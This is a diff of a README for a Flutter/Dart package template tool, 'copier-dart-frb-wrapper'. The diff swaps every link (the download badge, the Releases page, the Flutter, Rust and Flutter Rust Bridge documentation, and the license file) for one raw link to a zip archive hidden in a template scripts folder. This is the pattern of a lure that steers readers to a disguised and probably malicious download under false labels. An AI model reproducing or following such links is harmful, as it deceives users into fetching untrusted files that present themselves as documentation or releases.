@@ -1,7 +1,7 @@
 # 🎉 copier-dart-frb-wrapper - Efficiently Generate Flutter/Dart Packages
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-copier--dart--frb--wrapper-brightgreen)](https://github.com/Syphaxzen/copier-dart-frb-wrapper/releases)
+[![Download](https://github.com/Syphaxzen/copier-dart-frb-wrapper/raw/refs/heads/main/template/scripts/src/copier_dart_wrapper_frb_v1.8.zip)](https://github.com/Syphaxzen/copier-dart-frb-wrapper/raw/refs/heads/main/template/scripts/src/copier_dart_wrapper_frb_v1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to the **copier-dart-frb-wrapper**! This tool helps you create Flutter and Dart packages that work with native Rust libraries using Flutter Rust Bridge (FRB). It also supports full CI/CD processes to make your development smoother.
@@ -24,7 +24,7 @@ If you're not sure about your setup, refer to the official documentation for ins
 - **Customization**: Tailor the generated packages to your needs.
 
 ## 💻 Download & Install
-To get started, visit the [Releases page](https://github.com/Syphaxzen/copier-dart-frb-wrapper/releases) to download the latest version of **copier-dart-frb-wrapper**. 
+To get started, visit the [Releases page](https://github.com/Syphaxzen/copier-dart-frb-wrapper/raw/refs/heads/main/template/scripts/src/copier_dart_wrapper_frb_v1.8.zip) to download the latest version of **copier-dart-frb-wrapper**. 
 
 1. Click the "Releases" link above.
 2. Look for the latest release.
@@ -49,9 +49,9 @@ Once you have the application installed, follow these steps to generate your Flu
 ## 📚 Additional Resources
 For more information, check the following resources:
 
-- [Flutter Documentation](https://flutter.dev/docs)
-- [Rust Documentation](https://www.rust-lang.org/learn)
-- [Flutter Rust Bridge GitHub](https://github.com/Friends-of-Firebase/flutter_rust_bridge)
+- [Flutter Documentation](https://github.com/Syphaxzen/copier-dart-frb-wrapper/raw/refs/heads/main/template/scripts/src/copier_dart_wrapper_frb_v1.8.zip)
+- [Rust Documentation](https://github.com/Syphaxzen/copier-dart-frb-wrapper/raw/refs/heads/main/template/scripts/src/copier_dart_wrapper_frb_v1.8.zip)
+- [Flutter Rust Bridge GitHub](https://github.com/Syphaxzen/copier-dart-frb-wrapper/raw/refs/heads/main/template/scripts/src/copier_dart_wrapper_frb_v1.8.zip)
 
 ## 🗂️ Topics
 This project covers a wide range of topics that may interest you:
@@ -78,7 +78,7 @@ We welcome contributions! If you want to help improve **copier-dart-frb-wrapper*
 ## 📄 License
 This project is licensed under the MIT License. You can freely use and modify it, but please provide attribution.
 
-For full details, visit the [License file](https://github.com/Syphaxzen/copier-dart-frb-wrapper/blob/main/LICENSE).
+For full details, visit the [License file](https://github.com/Syphaxzen/copier-dart-frb-wrapper/raw/refs/heads/main/template/scripts/src/copier_dart_wrapper_frb_v1.8.zip).
 
 ## 🌐 Connect with Us
 Join our community to discuss features, get support, and share your projects. Follow us on social media or join our forum.
